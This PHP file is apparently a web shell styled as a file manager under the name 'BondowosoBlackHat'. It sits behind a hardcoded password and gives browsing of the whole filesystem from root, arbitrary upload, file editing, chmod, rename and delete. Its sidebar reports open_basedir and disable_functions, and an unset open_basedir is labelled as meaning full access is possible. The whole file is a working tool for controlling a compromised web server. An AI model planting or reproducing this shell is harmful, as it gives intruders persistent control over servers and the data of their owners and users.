<?php

session_start();

// ---------- CONFIGURATION ----------
$auth_password = 'coba';   // ubah password disini ya

// ---------- SIMPLE AUTHENTICATION ----------
if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $auth_password) {
        $_SESSION['fm_auth'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>Authentication Required</title><style>
        body{background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Segoe UI,sans-serif;}
        .login-box{background:white;padding:30px;border-radius:20px;box-shadow:0 15px 35px rgba(128,0,255,0.3);width:300px;}
        input,button{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:8px;}
        button{background:#6a1b9a;color:white;font-weight:bold;border:none;cursor:pointer;}
        button:hover{background:#9c27b0;}</style></head><body>
        <div class="login-box"><h2>BondowosoBlackHat</h2><form method="post"><input type="password" name="password" placeholder="Enter password" autofocus><button type="submit">Login</button></form></div>
        </body></html>';
        exit;
    }
}

// ---------- FUNCTIONS ----------
function format_bytes($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

// Get current directory: from GET['dir'], then validate
$current_dir = '/'; // default
if (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $input_dir = $_GET['dir'];
    // Remove null bytes
    $input_dir = str_replace("\0", '', $input_dir);
    // Resolve real path (follows symlinks, normalizes)
    $real = realpath($input_dir);
    if ($real !== false && is_dir($real)) {
        $current_dir = rtrim($real, '/') . '/';
    } else {
        // If invalid, stay in previous or root
        if (isset($_SESSION['last_dir']) && is_dir($_SESSION['last_dir'])) {
            $current_dir = rtrim($_SESSION['last_dir'], '/') . '/';
        } else {
            $current_dir = '/';
        }
    }
} elseif (isset($_SESSION['last_dir']) && is_dir($_SESSION['last_dir'])) {
    $current_dir = rtrim($_SESSION['last_dir'], '/') . '/';
} else {
    // try document root first, else getcwd, else root
    $try = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
    if ($try && is_dir($try)) {
        $current_dir = rtrim($try, '/') . '/';
    } else {
        $current_dir = '/';
    }
}
// Save for next time
$_SESSION['last_dir'] = $current_dir;

// Handle POST actions
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $target = $_POST['target'] ?? '';
    $new_name = $_POST['new_name'] ?? '';
    $content = $_POST['content'] ?? '';
    $perms = $_POST['perms'] ?? '';
    $new_folder = $_POST['new_folder'] ?? '';
    $new_file = $_POST['new_file'] ?? '';
    $chmod_target = $_POST['chmod_target'] ?? '';

    if ($action === 'upload' && isset($_FILES['upload_file'])) {
        $dest = $current_dir . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
            $message = "Upload success: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
        } else {
            $message = "Upload failed. Check directory permissions.";
        }
    }
    elseif ($action === 'rename' && !empty($target) && !empty($new_name)) {
        $old = $current_dir . $target;
        $new = $current_dir . $new_name;
        if (file_exists($old) && rename($old, $new)) {
            $message = "Renamed: $target -> $new_name";
        } else {
            $message = "Rename failed.";
        }
    }
    elseif ($action === 'chmod' && !empty($chmod_target) && !empty($perms)) {
        $path = $current_dir . $chmod_target;
        $octal = intval($perms, 8);
        if (@chmod($path, $octal)) {
            $message = "Chmod $perms applied to $chmod_target";
        } else {
            $message = "Chmod failed. (maybe not allowed)";
        }
    }
    elseif ($action === 'edit_save' && !empty($target) && isset($content)) {
        $path = $current_dir . $target;
        if (file_put_contents($path, $content) !== false) {
            $message = "File saved: $target";
        } else {
            $message = "Save failed. Check writable permission.";
        }
    }
    elseif ($action === 'mkdir' && !empty($new_folder)) {
        $path = $current_dir . basename($new_folder);
        if (!file_exists($path)) {
            if (@mkdir($path, 0755)) {
                $message = "Folder created: " . basename($new_folder);
            } else {
                $message = "Cannot create folder.";
            }
        } else {
            $message = "Folder already exists.";
        }
    }
    elseif ($action === 'touch' && !empty($new_file)) {
        $path = $current_dir . basename($new_file);
        if (!file_exists($path)) {
            if (file_put_contents($path, '') !== false) {
                $message = "File created: " . basename($new_file);
            } else {
                $message = "Cannot create file.";
            }
        } else {
            $message = "File already exists.";
        }
    }
    elseif ($action === 'delete' && !empty($target)) {
        $path = $current_dir . $target;
        if (is_file($path)) {
            if (@unlink($path)) $message = "Deleted file: $target";
            else $message = "Delete failed.";
        } elseif (is_dir($path)) {
            // Only delete empty folder
            if (count(glob($path . '/*')) === 0) {
                if (@rmdir($path)) $message = "Deleted empty folder: $target";
                else $message = "Cannot delete folder (not empty or permission).";
            } else {
                $message = "Folder not empty. Delete manually.";
            }
        }
    }
    elseif ($action === 'go_path') {
        $new_path = $_POST['manual_path'] ?? '';
        if (!empty($new_path)) {
            $new_path = str_replace("\0", '', $new_path);
            $real = realpath($new_path);
            if ($real !== false && is_dir($real)) {
                $current_dir = rtrim($real, '/') . '/';
                $_SESSION['last_dir'] = $current_dir;
                header("Location: ?dir=" . urlencode($current_dir));
                exit;
            } else {
                $message = "Invalid or inaccessible directory: " . htmlspecialchars($new_path);
            }
        }
    }
}

// Refresh after actions
if (isset($_SESSION['last_dir'])) {
    $current_dir = $_SESSION['last_dir'];
    $real = realpath($current_dir);
    if ($real !== false && is_dir($real)) {
        $current_dir = rtrim($real, '/') . '/';
        $_SESSION['last_dir'] = $current_dir;
    }
}

// Read directory contents
$items = @scandir($current_dir);
if ($items === false) {
    $error = "Cannot read directory: " . htmlspecialchars($current_dir);
    $items = [];
}
$dirs = [];
$files = [];
foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $full = $current_dir . $item;
    if (is_dir($full)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}
sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$all_items = array_merge($dirs, $files);

// Edit file
$edit_file = isset($_GET['edit']) ? basename($_GET['edit']) : '';
$edit_content = '';
if ($edit_file && file_exists($current_dir . $edit_file) && is_file($current_dir . $edit_file)) {
    $edit_content = htmlspecialchars(file_get_contents($current_dir . $edit_file));
}

// Server info
$disable_functions = ini_get('disable_functions');
$open_basedir = ini_get('open_basedir');
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$php_version = phpversion();
$max_upload = ini_get('upload_max_filesize');
$post_max = ini_get('post_max_size');
$is_writable = is_writable($current_dir) ? 'Yes (Writable)' : 'No (Not Writable)';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BondowosoBlackHat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f4f7fc;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            padding: 30px 20px;
            color: #1a1a2e;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 24px;
            box-shadow: 0 25px 45px -12px rgba(128, 0, 255, 0.45);
            overflow: hidden;
        }
        .header {
            background: #ffffff;
            padding: 20px 28px;
            border-bottom: 1px solid #e9ecef;
        }
        .header h1 {
            font-size: 1.9rem;
            font-weight: 500;
            color: #2c3e66;
            text-shadow: 0 2px 5px rgba(128, 0, 255, 0.2);
        }
        .path-bar {
            background: #f8f9fc;
            padding: 12px 28px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }
        .path {
            word-break: break-all;
            background: #edf2f7;
            padding: 6px 14px;
            border-radius: 40px;
            color: #4a5568;
            font-family: monospace;
            font-size: 0.85rem;
        }
        .writable-badge {
            background: #e6fffa;
            color: #234e52;
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        .manual-nav {
            background: #fef9e6;
            padding: 12px 28px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        .manual-nav form {
            display: flex;
            flex: 1;
            gap: 10px;
            flex-wrap: wrap;
        }
        .manual-nav input {
            flex: 3;
            padding: 8px 14px;
            border-radius: 12px;
            border: 1px solid #cbd5e0;
            font-family: monospace;
        }
        .manual-nav button {
            background: #6c5ce7;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        .two-columns {
            display: flex;
            flex-wrap: wrap;
        }
        .sidebar {
            width: 280px;
            background: #ffffff;
            border-right: 1px solid #eef2f6;
            padding: 20px;
        }
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-x: auto;
        }
        .action-card {
            background: #fefefe;
            border-radius: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
            margin-bottom: 28px;
            padding: 16px 18px;
            border: 1px solid #edeff5;
        }
        .action-card h3 {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: #4a3f7e;
            border-left: 4px solid #9b59b6;
            padding-left: 12px;
        }
        .form-group {
            margin-bottom: 12px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        input, select, textarea, button {
            padding: 8px 14px;
            border-radius: 12px;
            border: 1px solid #cbd5e0;
            font-family: inherit;
            font-size: 0.9rem;
            background: white;
        }
        button {
            background: #6c5ce7;
            color: white;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            box-shadow: 0 2px 6px rgba(108,92,231,0.2);
        }
        button:hover {
            background: #5a4ad1;
            transform: translateY(-1px);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 20px;
            overflow: hidden;
        }
        th, td {
            text-align: left;
            padding: 12px 10px;
            border-bottom: 1px solid #edf2f7;
        }
        th {
            background: #f9fafc;
            font-weight: 600;
            color: #2d3748;
        }
        tr:hover {
            background: #faf5ff;
        }
        .actions a, .actions button {
            margin: 0 5px;
            text-decoration: none;
            font-size: 0.85rem;
            padding: 4px 8px;
            border-radius: 20px;
            background: #f1f3f5;
            color: #2d3748;
            border: none;
            cursor: pointer;
        }
        .actions a.danger, .actions button.danger {
            color: #c0392b;
            background: #ffe6e5;
        }
        .message {
            background: #e9f7e1;
            padding: 12px 20px;
            border-radius: 40px;
            margin-bottom: 20px;
            color: #2c6e2c;
        }
        .error {
            background: #ffe6e5;
            color: #c0392b;
        }
        .server-info {
            background: #faf5ff;
            border-radius: 20px;
            padding: 12px 16px;
            font-size: 0.8rem;
            font-family: monospace;
            margin-top: 20px;
            border: 1px solid #e9d9ff;
        }
        .footer {
            font-size: 0.75rem;
            text-align: center;
            padding: 18px;
            border-top: 1px solid #eceff5;
            color: #6c7293;
        }
        @media (max-width: 800px) {
            .two-columns { flex-direction: column; }
            .sidebar { width: 100%; border-right: none; border-bottom: 1px solid #eef2f6; }
        }
        .folder-link {
            font-weight: 500;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>BondowosoBlackHat</h1>
    </div>
    <div class="path-bar">
        <div class="path">Current: <?php echo htmlspecialchars($current_dir); ?></div>
        <div class="writable-badge">Writable: <?php echo $is_writable; ?></div>
    </div>
    <div class="manual-nav">
        <strong>Jump to path:</strong>
        <form method="post">
            <input type="hidden" name="action" value="go_path">
            <input type="text" name="manual_path" placeholder="Enter absolute path, e.g., /home, /var/www" value="<?php echo htmlspecialchars($current_dir); ?>">
            <button type="submit">Go</button>
        </form>
        <a href="?dir=<?php echo urlencode(dirname(rtrim($current_dir,'/'))); ?>" style="background:#e2e8f0; padding:6px 16px; border-radius:40px; text-decoration:none; color:#2d3748;">Parent Directory</a>
        <a href="?" style="background:#e2e8f0; padding:6px 16px; border-radius:40px; text-decoration:none;">Reset</a>
    </div>
    <?php if (isset($error)): ?>
        <div class="message error"><?php echo $error; ?></div>
    <?php endif; ?>
    <?php if ($message): ?>
        <div class="message"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>
    <div class="two-columns">
        <div class="sidebar">
            <div class="action-card">
                <h3>Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <div class="form-group"><input type="file" name="upload_file" required></div>
                    <button type="submit">Upload</button>
                </form>
            </div>
            <div class="action-card">
                <h3>Create Folder</h3>
                <form method="post">
                    <input type="hidden" name="action" value="mkdir">
                    <div class="form-group"><input type="text" name="new_folder" placeholder="folder_name" required></div>
                    <button type="submit">Create</button>
                </form>
            </div>
            <div class="action-card">
                <h3>Create File</h3>
                <form method="post">
                    <input type="hidden" name="action" value="touch">
                    <div class="form-group"><input type="text" name="new_file" placeholder="file.txt" required></div>
                    <button type="submit">Create Empty File</button>
                </form>
            </div>
            <div class="action-card">
                <h3>Rename Item</h3>
                <form method="post">
                    <input type="hidden" name="action" value="rename">
                    <div class="form-group"><input type="text" name="target" placeholder="current name" required></div>
                    <div class="form-group"><input type="text" name="new_name" placeholder="new name" required></div>
                    <button type="submit">Rename</button>
                </form>
            </div>
            <div class="action-card">
                <h3>Chmod (octal)</h3>
                <form method="post">
                    <input type="hidden" name="action" value="chmod">
                    <div class="form-group"><input type="text" name="chmod_target" placeholder="file/folder name" required></div>
                    <div class="form-group"><input type="text" name="perms" placeholder="e.g. 0644 or 0755" required></div>
                    <button type="submit">Apply Chmod</button>
                </form>
            </div>
            <div class="server-info">
                <strong>Server Environment</strong><br>
                PHP Version: <?php echo $php_version; ?><br>
                Server: <?php echo htmlspecialchars($server_software); ?><br>
                Upload max: <?php echo $max_upload; ?><br>
                Post max: <?php echo $post_max; ?><br>
                <strong>open_basedir:</strong><br>
                <small><?php echo htmlspecialchars($open_basedir) ?: 'not set (full access possible)'; ?></small><br>
                <strong>disable_functions:</strong><br>
                <small><?php echo htmlspecialchars($disable_functions) ?: 'none'; ?></small>
            </div>
        </div>
        <div class="main-content">
            <table>
                <thead>
                    <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>Actions</th></tr>
                </thead>
                <tbody>
                <?php foreach ($all_items as $item): 
                    $full_path = $current_dir . $item;
                    $is_dir = is_dir($full_path);
                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    $size = $is_dir ? '-' : format_bytes(filesize($full_path));
                    $mtime = date('Y-m-d H:i:s', filemtime($full_path));
                ?>
                    <tr>
                        <td class="folder-link">
                            <?php if ($is_dir): ?>
                                📁 <a href="?dir=<?php echo urlencode($full_path); ?>" style="text-decoration:none; color:#2c3e66; font-weight:500;"><?php echo htmlspecialchars($item); ?></a>
                            <?php else: ?>
                                📄 <?php echo htmlspecialchars($item); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td><?php echo $perms; ?></td>
                        <td><?php echo $mtime; ?></td>
                        <td class="actions">
                            <?php if (!$is_dir): ?>
                                <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>">Edit</a>
                            <?php endif; ?>
                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($item); ?> ?');">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                                <button type="submit" class="danger">Del</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
            <?php if ($edit_file): ?>
            <div style="margin-top: 35px; background:#fdfdfd; border:1px solid #d9d9ff; border-radius: 24px; padding: 20px;">
                <h3 style="margin-bottom:10px;">Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="edit_save">
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="content" rows="15" style="width:100%; font-family: monospace; border-radius: 16px;"><?php echo $edit_content; ?></textarea>
                    <div style="margin-top: 12px;">
                        <button type="submit">Save Changes</button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>" style="margin-left:12px; background:#edf2f7; padding:8px 16px; border-radius:40px; text-decoration:none;">Cancel</a>
                    </div>
                </form>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <div class="footer">
       BondowosoBlackHat - FM | H4nSec01 
    </div>
</div>
</body>
</html>
